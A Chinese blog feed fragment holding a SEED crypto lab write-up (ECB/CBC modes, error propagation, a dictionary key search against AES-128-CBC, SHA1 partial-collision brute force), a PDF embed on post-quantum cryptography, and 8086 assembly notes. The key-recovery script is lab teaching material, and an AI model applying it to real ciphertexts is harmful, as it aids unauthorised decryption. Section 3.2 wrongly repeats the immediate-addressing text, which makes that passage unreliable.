<h4 id="2-2-Task-2：加密模式：ECB-vs-CBC"><a href="#2-2-Task-2：加密模式：ECB-vs-CBC" class="headerlink" title="2.2 Task 2：加密模式：ECB vs. CBC"></a>2.2 Task 2：加密模式：ECB vs. CBC</h4><p>​    文件pic_original.bmp包含一个简单的图片。我们想加密这张图片，所以没有加密密钥的人无法知道图片的内容。请分别使用ECB和CBC模式加密文件。</p>
<p>​    首先使用aes-128-cbc对pic_original.bmp进行加密，但是加密完图片并不能正常打开，会提示header data出错。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225221922621.png" alt="image-20221225221922621"></p>
<p>​    接下来我们将原始图片的header data替换到新的加密后的header data中</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225223403342.png" alt="image-20221225223403342"></p>
<p>​    然后再使用图片软件打开new.bmp,可以发现像素点十分混乱，基本提取不到和原始图像相关的任何信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225223612531.png" alt="image-20221225223612531"></p>
<p>​    接下来使用ECB模式进行加密可以看到提示加密过程中没有使用到IV，用同样的方式处理图片，最终可以看出加密后的图片反映出原始图像的大概轮廓。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225223848141.png" alt="image-20221225223848141"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225223650599.png" alt="image-20221225223650599"></p>
<p>​    这是由于ECB模式并没有使用IV，因此对相同的明文分组加密使用相同的Key，最终导致相同的明文分组会加密成相同的值，因此对于图片内相同的像素信息会在加密结果上反应出来。</p>
<h4 id="2-3-Task-3-错误传播-被破坏的密文"><a href="#2-3-Task-3-错误传播-被破坏的密文" class="headerlink" title="2.3 Task 3: 错误传播-被破坏的密文"></a>2.3 Task 3: 错误传播-被破坏的密文</h4><p>​    为了理解各种工作模式的在错误传播上的性质，请做以下练习： </p>
<ol>
<li>创建一个至少 1000 字节长的文本文件。 </li>
<li>使用 AES-128 算法加密文件。 </li>
<li>不幸的是，加密文件中第 55 个字节的某一个 bit 已损坏。你可以使用 bless十六进制编辑器来破坏 该文件。 </li>
<li>使用正确的密钥和 IV 解密损坏的密文文件。</li>
</ol>
<p>​    首先需要创建一个至少1000字节的文本文件，使用wc对plain.txt进行统计，发现该文件9行385个单词2628个字节，正好满足要求。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225225510843.png" alt="image-20221225225510843"></p>
<p>​    下面使用ECB和CBC模式分别对文件进行加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226121944917.png" alt="image-20221226121944917"></p>
<p>​    然后再使用bless工具将第55字节的内容进行更改,首先找到第55个字节73的位置，然后更改其中的一个bit位，这里我把73改成了71</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226144548318.png" alt="image-20221226144548318"></p>
<p>​    然后使用ECB对密文进行解密运算，查看解密文件的内容，从解密结果中可以看出，使用ECB模式最终影响了16个字节也就是一个明文分组的解密，这是由于ECB模式每一个密文分组的解密都是独立的，不会受到其它密文分组的影响。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226155231394.png" alt="image-20221226155231394"></p>
<p>​    下面对CBC模式加密后的密文进行处理，这里我将47改变一个bit值改为07。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226155815227.png" alt="image-20221226155815227"></p>
<p>​    然后重新使用解密模块对内容进行解密，可以看出使用CBC模式情况下，1bit的密文分组错误影响了两个明文分组的解密，这是由于密文分组的错误不仅影响对应明文的解密，而且由于下一组密文分组解密还需要和前一组进行异或，所以最终会影响两组的解密。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226160650840.png" alt="image-20221226160650840"></p>
<h4 id="2-5-Task-4-寻找密钥"><a href="#2-5-Task-4-寻找密钥" class="headerlink" title="2.5 Task 4: 寻找密钥"></a>2.5 Task 4: 寻找密钥</h4><p>​    你得到一个明文和一个密文，你知道 aes-128-cbc 用于从明文生成密文。你得到的另一条线索是， 加密此明文使用的密钥是一个少于 16 个字符的英语单词。这个单词可以从英语字典中找到。由于这个单词少于 16 个字符（即 128 bits ）1，在单词的结尾附加了一些井号（#：十六进制值是 0x23）构成一个 128 bits 的密钥。</p>
<p>​    编写下面的程序来寻找密钥，密钥从word.txt中进行获取，首先对密钥 字节数进行判断，不满16字节的进行#填充。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">Cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;7827baf49c2464156528d99a0fcda1c714d7cb591fbed2364c41a9fc03596cc4&quot;</span>)</span><br><span class="line">Iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;010203040506070809000a0b0c0d0e0f&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;words.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    key = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#去掉每一个密钥后面的换行符</span></span><br><span class="line">    <span class="keyword">while</span> key:</span><br><span class="line">        <span class="comment">#key = key.encode()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key)&lt;<span class="number">16</span>:</span><br><span class="line">            key += <span class="string">&#x27;#&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(key))</span><br><span class="line">            key = key.encode()</span><br><span class="line">            <span class="comment">#print(key,bytes.__len__(key))</span></span><br><span class="line">            aes = AES.new(key,AES.MODE_CBC,Iv)</span><br><span class="line">            plain = aes.decrypt(Cipher)</span><br><span class="line">            <span class="keyword">if</span> plain[:<span class="number">21</span>]  == <span class="string">&#x27;This is a top secret.&#x27;</span>.encode():</span><br><span class="line">                <span class="built_in">print</span>(key)</span><br><span class="line">        key = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
<p>​    这里我们使用了python程序进行求解，这里注意一点，由于明文并不是128个bit的整数倍，因此加密的时候会进行填充，但解密出的前21个字符一定是确定内容。运行程序，最终找到密钥wizard。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226212114736.png" alt="image-20221226212114736"></p>
<h4 id="2-6-Task-5-生成消息摘要"><a href="#2-6-Task-5-生成消息摘要" class="headerlink" title="2.6 Task 5: 生成消息摘要"></a>2.6 Task 5: 生成消息摘要</h4><p>​    这个任务中，我们将使用哈希算法生成文件的哈希值，可以使用man dgest进行手册查找</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226213748361.png" alt="image-20221226213748361"></p>
<p>​    下面我使用了-md5、-sha1、-sha256等三种方式对plain.txt进行哈希运算，可以看到使用命令后返回了哈希运算以后的值，不同的哈希算法的哈希值长度也不同。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226214254066.png" alt="image-20221226214254066"></p>
<h4 id="2-7-Task-6：哈希函数的输出特性"><a href="#2-7-Task-6：哈希函数的输出特性" class="headerlink" title="2.7 Task 6：哈希函数的输出特性"></a>2.7 Task 6：哈希函数的输出特性</h4><p>​    要了解哈希函数的输出性质，我们希望使用SHA1执行下面的练习</p>
<p>1.使用SHA1算法为plain.txt生成哈希值$H_1$</p>
<p>2.修改输入文件的一位</p>
<p>3.为修改后的文件生成哈希值$H_2$</p>
<p>​    这里我们使用bless将第一个bit 1修改为了bit 0，也就是将第一个字节49修改为了09.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226215102390.png" alt="image-20221226215102390"></p>
<p>​    将修改前后的文件进行哈希运算，可以看到$H_1$和$H_2$不仅不相同，而且每一个字节都不相等，这也说明了哈希函数的性质，哈希函数能够很好的隐藏明文，并且输出是足够随机和均匀的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221226215221096.png" alt="image-20221226215221096"></p>
<h4 id="2-8-Task-7：单向性与抗碰撞性"><a href="#2-8-Task-7：单向性与抗碰撞性" class="headerlink" title="2.8 Task 7：单向性与抗碰撞性"></a>2.8 Task 7：单向性与抗碰撞性</h4><p>​    哈希函数的具有单向性与抗碰撞性。在这个实验里我们将使用暴力穷举方法来测试抗碰撞性，即找到具有相同哈希值的两个文件。你的目标是，在给定一个文件，编写一个程序来找出另一个具有相同哈希值的文件。这里我们只使用SHA1哈希值的前24位。</p>
<p>​    首先先对消息的规模做大致的估算，由于这里我们只是用前24位，那我们也大概需要$2^{24}$个随机消息即可，这里我们使用10个数字和26个字母，大概需要长度5的随机字符就可以，这里我们可以增加字符串随机范围，也可以加入符号进行运算。我编写了下面的程序，通过生成随机字符串和写入文件进行哈希运算，然后将哈希运算结果和original.txt的运算结果进行比较，这里注意只要前24位相等即可，转化为16进制位也就是6位。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">length</span>):</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Word = string.ascii_letters + string.digits + <span class="string">&quot;.?, &quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        random_str += random.choice(Word)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"><span class="comment">#获得随机字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    length = <span class="number">10</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;original.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        origin = f.read()</span><br><span class="line">    h1 = hashlib.sha1()</span><br><span class="line">    h1.update(origin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The hash value of the original.txt is:&quot;</span>,h1.hexdigest())</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    flag = h1.hexdigest()[:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        content = generate_random_str(length)</span><br><span class="line">        fw = <span class="built_in">open</span>(<span class="string">&#x27;temp.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fw.write(content)</span><br><span class="line">        fw.close()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;temp.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            value = f.read()</span><br><span class="line">        <span class="comment">#print(value)</span></span><br><span class="line">        h2 = hashlib.sha1()</span><br><span class="line">        h2.update(value)</span><br><span class="line">        <span class="keyword">if</span> h2.hexdigest()[:<span class="number">6</span>] == flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The collision of the hash value is:&quot;</span>,h2.hexdigest())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The content of the file is:&quot;</span>,content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Numbers of attempts:&quot;</span>,count)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    运行程序，在暴力尝试了14517620次以后，找到了一个前24位相同的文件temp.txt,文件的内容是字符串nX9fsZVnVm,具体结果如下图所示.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221227170557089.png" alt="image-20221227170557089"></p>
<p>​    之后我又进行了多次实验，由于找寻随机串随机性的存在，尝试次数可能差距较大，但是10次实验中平均数据在12951435次，和$2^{24}$数据接近。下面展示了部分的实验结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221227175555875.png" alt="image-20221227175555875"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221228164015777.png" alt="image-20221228164015777"></p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221228195948669.png" alt="image-20221228195948669"></p>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
  <entry>
    <title>后量子密码</title>
    <url>/2023/04/26/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[

	<div class="row">
    <embed src="/pdf/后量子密码.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言1</title>
    <url>/2023/01/07/%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h3 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h3><p>​    8086 寄存器都是 16 位的寄存器，根据用途可分为 4 种类型。分别是数据寄存器、地址寄存器、段寄存器和控制寄存器。</p>
<p>如图所示:</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid332time1419944230704" alt="img"></p>
<h4 id="（1）数据寄存器"><a href="#（1）数据寄存器" class="headerlink" title="（1）数据寄存器"></a>（1）数据寄存器</h4><p>数据寄存器中每个寄存器又可以分为 2 个 8 位的寄存器。分别为 AH、AL，BH、BL，CH、CL，DH、DL。H 表示高字节（高 8 位）寄存器、L 表示低字节（低 8 位）寄存器。</p>
<p>例如：用 AX 寄存器存放一个字 1234H，表示为 (AX)=1234H，即高字节 12 放在 AH，低字节 34 放在 AL 中。</p>
<h4 id="（2）地址寄存器"><a href="#（2）地址寄存器" class="headerlink" title="（2）地址寄存器"></a>（2）地址寄存器</h4><p>地址寄存器包括指针和变址寄存器 SP、BP、SI、DI 四个 16 位寄存器。</p>
<p>顾名思义，它们可用来存放存储器操作数的偏移地址。另外，它们也可以作为通用寄存器用。</p>
<h4 id="（3）段寄存器"><a href="#（3）段寄存器" class="headerlink" title="（3）段寄存器"></a>（3）段寄存器</h4><p>8086CPU 有 4 个 16 位的段寄存器，分别是 CS 代码段寄存器、DS 数据段寄存器、ES 附加段寄存器、SS 堆栈段寄存器。</p>
<h4 id="（4）控制寄存器"><a href="#（4）控制寄存器" class="headerlink" title="（4）控制寄存器"></a>（4）控制寄存器</h4><p>控制寄存器包括 IP 和 FLAGS（又称为 PSW 程序状态字）两个 16 位寄存器，用于控制程序的执行。</p>
<p>IP 指令指针寄存器，用来存放代码段中的偏移地址，指出当前正在执行指令的下一条指令所在单元的偏移地址。</p>
<p>FLAGS 标志寄存器中的某位代表 CPU 的 1 个标志，表示出 CPU 的某种执行状态。最低位为 D0，最高位为 D15。8086CPU 的标志寄存器共有 9 个标志，分别为 6 个条件码标志和 3 个控制标志。如图：</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid332time1419944173776" alt="img"></p>
<p>（1）条件码标志</p>
<ul>
<li>CF 进位标志。当指令执行结果的最高位向前有进位时，CF=1，否则 CF=0。</li>
<li>SF 符号标志。当指令执行结果的最高位（符号位）为负时，SF=1，否则 SF=0。</li>
<li>ZF 零标志。当指令执行结果为 0 时，ZF=1，结果不为 0 时，ZF=0。</li>
<li>OF 溢出标志。当指令执行结果有溢出（超出了数的表示范围）时，OF=1，否则 OF=0。</li>
<li>AF 辅助进位标志。当指令执行结果的第 3 位（半字节）向前有进位时，AF=1，否则 AF=0。</li>
<li>PF 奇偶标志。当指令执行结果中 1 的个数为偶数个时，PF=1，否则 PF=0。</li>
</ul>
<p>（2）控制标志</p>
<ul>
<li>DF 方向标志。执行串处理指令时，若设置 DF=0，存储单元的地址寄存器的值自动增加，若设置 DF=1，存储单元的地址寄存器的值自动减小。</li>
<li>IF 中断标志。设置 IF=1，允许 CPU 响应可屏蔽中断，IF=0 则不响应。</li>
<li>TF 陷阱标志。在 DEBUG 调试时，TF=1，采用单步执行方式，即进入陷阱；TF=0，正常执行程序。</li>
</ul>
<p>例：两个二进制数相加运算，有关标志位自动发生变化。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid332time1419948800662" alt="img"></p>
<p>根据计算结果可知 CPU 会自动地把标志位设为：CF=0，SF=1，ZF=0，OF=0，PF=0，即无进位，结果为负数，结果不为 0，没有溢出，奇数个 1。</p>
<p>对溢出的判断也可以从简单的角度理解，因为进行运算的二进制数是补码，可看出本题是一个负数和一个正数相加，结果为负数，不溢出。若两个正数相加，结果为负数，或者两个负数相加，结果为正数，那都是溢出了，说明 8 位补码已经表示不了该结果。</p>
<p><strong><code>小贴士</code></strong> DEBUG 下的标志位表示</p>
<p>在 DEBUG 调试环境下以字母缩写的形式表示各个标志位的状态。进入 DEBUG 后，用 R 命令查看寄存器状态时，可以看到除了陷阱标志以外的标志位的状态。</p>
<p>如表 2-1 所示：</p>
<p><img src="https://doc.shiyanlou.com/document-uid12501labid332timestamp1458139296969.png" alt="此处输入图片的描述"></p>
<p><strong><code>小贴士</code></strong> 数的补码运算</p>
<p>在计算机中，对带符号数可用真值和机器数两个概念表示。</p>
<p>真值，就是带有“+”、“-”号的实际数值；所谓机器数，则是把“+”、“-”符号数值化（0、1）后所得到的计算机实际能表示的数。</p>
<p>机器数有三种码表示，分别是原码、反码和补码。汇编语言中，数都是以补码的形式表示的，因此必须掌握数的补码表示和补码的运算。这三种码的定义如下：</p>
<ul>
<li>原码。原码将最高位作为符号位，正数为 0，负数为 1，其余 7 位作为数值位。</li>
<li>反码。正数的反码与正数的原码一样。而求负数的反码时，符号位为 1，数值位在原码的基础上求反。</li>
<li>补码。正数的补码与正数的原码一样。求负数的补码时，符号位为 1，数值位在原码的基础上求反加 1。</li>
</ul>
<p>在汇编语言中，内存是非常重要的学习内容。我们先要对内存地址和存储单元的概念进行学习。</p>
<p>对存储单元的标识可以用物理地址或逻辑地址表示。</p>
<h3 id="2-内存地址"><a href="#2-内存地址" class="headerlink" title="2.内存地址"></a>2.内存地址</h3><h4 id="（1）物理地址"><a href="#（1）物理地址" class="headerlink" title="（1）物理地址"></a>（1）物理地址</h4><p>物理地址是内存单元的真实地址，存储单元的物理地址是唯一的。</p>
<p>Intel 8086 CPU 有 20 根地址线，因此其存储空间可达 2 的 20 次方 = 1 M 个字节单元（1MB）。地址都是从 0 开始的，在 20 位地址线的存储空间中采用十六进制表示的物理地址范围是 <code>00000H</code> ～ <code>FFFFFH</code>。</p>
<h4 id="（2）逻辑地址"><a href="#（2）逻辑地址" class="headerlink" title="（2）逻辑地址"></a>（2）逻辑地址</h4><p>逻辑地址是用户编程时使用的地址，分为段地址和偏移地址两部分。</p>
<p>在 8086 汇编语言中，把内存地址空间划分为若干逻辑段，每段由一些存储单元构成，每段最大为 65536 个字节单元（0 号单元～65535 号单元 0000H～FFFFH）。用段地址指出是哪一段，偏移地址标明是该段中的哪个单元。段地址和偏移地址都是 16 位二进制数。</p>
<p>逻辑地址的形式：<code>段地址:偏移地址</code>。</p>
<p><img src="https://doc.shiyanlou.com/document-uid12501labid332timestamp1458138725718.png" alt="此处输入图片的描述"></p>
<p>例如：在上图中，内存划分出了若干段。0 号段，1 号段，…，每一段都有 0 号单元、1 号单元、2 号单元，…。每段的长度可以不一样，如 0 号段从 0 号单元到 0FH 号单元共 16 个字节单元，1 号段从 0 号单元到 0139H 号单元共 314 个字节单元。</p>
<p>用段地址表示段号，偏移地址代表每一段中的单元号，比如 0000:0002H 代表 0 号段的 2 号单元，0001:0002H 代表 1 号段的 2 号单元，以此类推。因此，偏移地址的通俗含义是在该段内，相对于段地址偏移了多少个单元。</p>
<h4 id="（3）逻辑地址转换为物理地址"><a href="#（3）逻辑地址转换为物理地址" class="headerlink" title="（3）逻辑地址转换为物理地址"></a>（3）逻辑地址转换为物理地址</h4><p>用户编程时采用的逻辑地址在 CPU 执行程序时都要转换成实际的物理地址，这个转换过程是由 CPU 中的地址加法器自动完成的。</p>
<p>转换时先将 16 位的段地址左移 4 位，相当于乘以 16 或十六进制的 10H，再和偏移地址相加。转换公式为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">物理地址 = 段地址 × 10H + 偏移地址</span><br></pre></td></tr></table></figure>
<p>例：若某单元的逻辑地址为 0001:0002H，其物理地址 = 0001H × 10H + 0002H = 00012H；另一单元的逻辑地址为 3020:055AH，其物理地址 = 3020H × 10H + 055AH = 3075AH。</p>
<p>存储器逻辑分段类型如下：</p>
<ul>
<li>代码段：用于存放指令，段地址存放在段寄存器 CS。</li>
<li>数据段：用于存放数据，段地址存放在段寄存器 DS。</li>
<li>附加段：用于辅助存放数据，段地址存放在段寄存器 ES。</li>
<li>堆栈段：是重要的数据结构，可用来保存数据、地址和系统参数，段地址存放在段寄存器 SS。</li>
</ul>
<p>存储单元中的数据称为存储单元内容，一个实际的存储单元只能存放一个字节（8 位二进制）的数据。存储单元的地址和内容的表示形式为用括号将地址括起来以代表单元的内容。如（3075AH）=12H，表示 3075AH 号单元中的内容是 12 H，称为字节单元；若（37692H）=5678H，表示 37692H 单元和 37693H 单元一起存放 5678H，该单元是字单元。字单元在存储的时候，高字节放在高地址单元，低字节放在低地址单元，即 56H 放在 37693H 单元，78H 放在 37692H 单元。如图：</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid332time1419950442525" alt="img"></p>
<h3 id="3-寻址方式"><a href="#3-寻址方式" class="headerlink" title="3.寻址方式"></a>3.寻址方式</h3><ul>
<li>立即寻址方式(Immediate addressing)</li>
<li>寄存器寻址方式(Register addressing)</li>
<li>直接寻址方式(Direct addressing)</li>
<li>寄存器间接寻址方式(Register indirect addressing)</li>
<li>寄存器相对寻址方式(Register relative addressing)</li>
<li>基址变址寻址方式(Based indexed addressing)</li>
<li>相对基址变址寻址方式(Relative based indexed addressing)</li>
</ul>
<h5 id="3-1-立即寻址方式"><a href="#3-1-立即寻址方式" class="headerlink" title="3.1 立即寻址方式"></a>3.1 立即寻址方式</h5><p>所要找的操作数直接写在指令中，这种操作数叫立即数。在 8086、80286 中立即数是 8 位或 16 位的，在 80386 以上可以是 32 位的立即数。立即寻址方式用来表示常数。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid342time1420032745560" alt="img"></p>
<h5 id="3-2-寄存器寻址方式"><a href="#3-2-寄存器寻址方式" class="headerlink" title="3.2 寄存器寻址方式"></a>3.2 寄存器寻址方式</h5><p>所要找的操作数直接写在指令中，这种操作数叫立即数。在 8086、80286 中立即数是 8 位或 16 位的，在 80386 以上可以是 32 位的立即数。立即寻址方式用来表示常数。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid342time1420032745560" alt="img"></p>
<h5 id="3-3直接寻址方式"><a href="#3-3直接寻址方式" class="headerlink" title="3.3直接寻址方式"></a>3.3直接寻址方式</h5><p>操作数存放在内存中。操作数的偏移地址（也称为有效地址 EA）直接写在指令中。</p>
<p>（1）存储器读操作</p>
<p>MOV 指令可以实现 CPU 对存储器的读写。若传送指令的目的操作数是 CPU 的寄存器，源操作数是存储单元，就完成了对存储器的读操作。</p>
<p>例如：<code>MOV AX,DS:[2000H]</code> 表示该指令表示从数据段的 2000H 单元读出一个字送入 AX。</p>
<p>（2）存储器写操作</p>
<p>如果要实现 CPU 写内存操作，只要把 MOV 指令的目的操作数变为存储单元，源操作数为 CPU 的寄存器即可。</p>
<p>例如：<code>MOV DS:[4000H],AX</code> 将 AX 的值写入数据段的 4000H 单元。</p>
<p>在 DEBUG 下执行：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">-A</span><br><span class="line">MOV AX，DS:[2000]</span><br><span class="line">MOV DS:[4000]，AX</span><br></pre></td></tr></table></figure>
<h5 id="3-4-寄存器间接寻址方式"><a href="#3-4-寄存器间接寻址方式" class="headerlink" title="3.4 寄存器间接寻址方式"></a>3.4 寄存器间接寻址方式</h5><p>操作数存放在内存中。</p>
<p>指令形式如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MOV  AX，[BX]</span><br></pre></td></tr></table></figure>
<p>操作数的 EA 在基址寄存器 BX、BP 或变址寄存器 SI、DI 中，而操作数的段地址在数据段 DS 或堆栈段 SS 中。如果有效地址由 BX、SI、DI 指出，则默认为对应于数据段，而用 BP 指出则对应于堆栈段。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid342time1420038584565" alt="img"></p>
<h5 id="3-5-寄存器相对寻址方式"><a href="#3-5-寄存器相对寻址方式" class="headerlink" title="3.5 寄存器相对寻址方式"></a>3.5 寄存器相对寻址方式</h5><p>操作数存放在内存中。</p>
<p>指令形式如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MOV  AX，[BX+1200H]</span><br></pre></td></tr></table></figure>
<p>操作数的 EA 是一个基址或变址寄存器的内容再加上 8 位或 16 位位移量之和。也就是说在寄存器间接寻址的基础上，增加一个相对量（位移量）。这个位移量可以是立即数，也可以是符号地址。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid342time1420163820552" alt="img"></p>
<h5 id="3-6-基址变址寻址方式"><a href="#3-6-基址变址寻址方式" class="headerlink" title="3.6 基址变址寻址方式"></a>3.6 基址变址寻址方式</h5><p>操作数存放在内存中。</p>
<p>指令形式如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MOV  AX，[BX+SI]</span><br></pre></td></tr></table></figure>
<p>操作数的 EA 为一个基址寄存器和一个变址寄存器的内容之和。</p>
<h3 id="4-dubug调试"><a href="#4-dubug调试" class="headerlink" title="4.dubug调试"></a>4.dubug调试</h3><p>在 DOS 操作系统和 Windows 操作系统中，都提供了调试工具 DEBUG。</p>
<p>DEBUG 是为汇编语言设计的一种调试工具，它通过单步、设置断点等方式为程序员提供了非常有效的调试手段。利用它可以观察和修改 CPU 的寄存器、内存单元；可以跟踪程序的运行，发现程序的错误。</p>
<p>实验楼环境中采用 <code>dosemu</code> 来模拟 DOS 环境，进入 DOS 环境中可以直接启动 DEBUG 程序。</p>
<p>DEBUG 命令有 20 多个，我们主要学习最常用的命令。</p>
<ul>
<li><code>R</code> ——查看和修改寄存器</li>
<li><code>D</code> ——查看内存单元</li>
<li><code>E</code> ——修改内存单元</li>
<li><code>U</code> ——反汇编，将机器指令变为汇编指令</li>
<li><code>T</code> / <code>P</code> ——单步执行</li>
<li><code>G</code> ——连续执行程序</li>
<li><code>A</code> ——输入汇编指令</li>
<li><code>Q</code> ——退出</li>
</ul>
<h4 id="基础实验1"><a href="#基础实验1" class="headerlink" title="基础实验1"></a>基础实验1</h4><ol>
<li>AX、BX 寄存器分别赋值为 <code>0008H</code> 和 <code>0006H</code></li>
<li>AX 和 BX 的内容相加，结果在 AX 中</li>
<li>用寄存器间接寻址将相加的结果保存到 6 号单元，指令如下：</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MOV AX，0008H</span><br><span class="line">MOV BX，0006H</span><br><span class="line">ADD AX，BX</span><br><span class="line">MOV [BX]，AX</span><br><span class="line">HLT                   ；停机指令</span><br></pre></td></tr></table></figure>
<p>​    在 DEBUG 下，用 A 命令输入上述四条指令，再用 R 命令显示寄存器的情况：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230107112703525.png" alt="image-20230107112703525"></p>
<p>先使用R查看当前指令的地址，这里要注意IP指令寄存器要在CS段的指令位置上，然后使用T命令进行单步的调试，可以看到寄存器之间值的变化，以及最终内存单元内值的变化</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230107113057454.png" alt="image-20230107113057454">执行加法命令后，<code>AX=000EH</code>；相应的标志位：进位标志 NC，即 <code>CF=0</code>；符号标志 PL，即 <code>SF=0</code>；零标志 NZ，即 <code>ZF=0</code>；溢出标志 NV，即 <code>OF=0</code>；表示运算结果无进位、不溢出、结果不为 0、结果是正数。</p>
<h4 id="基础实验2"><a href="#基础实验2" class="headerlink" title="基础实验2"></a>基础实验2</h4><h5 id="（1）两个操作数相减运算，结果放在数据段的16号单元"><a href="#（1）两个操作数相减运算，结果放在数据段的16号单元" class="headerlink" title="（1）两个操作数相减运算，结果放在数据段的16号单元"></a>（1）两个操作数相减运算，结果放在数据段的16号单元</h5><ol>
<li><p>AX、BX 寄存器分别赋值为 <code>0008H</code> 和 <code>0010H</code>；</p>
</li>
<li><p>AX 和 BX 的内容相减（SUB 指令），结果在 AX 中；</p>
</li>
<li><p>用直接寻址方式将相减的结果保存到 6 号单元。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230108162440018.png" alt="image-20230108162440018"></p>
</li>
</ol>
<p>可以看到减法的结果以补码的形式表示，对应的真值为负数</p>
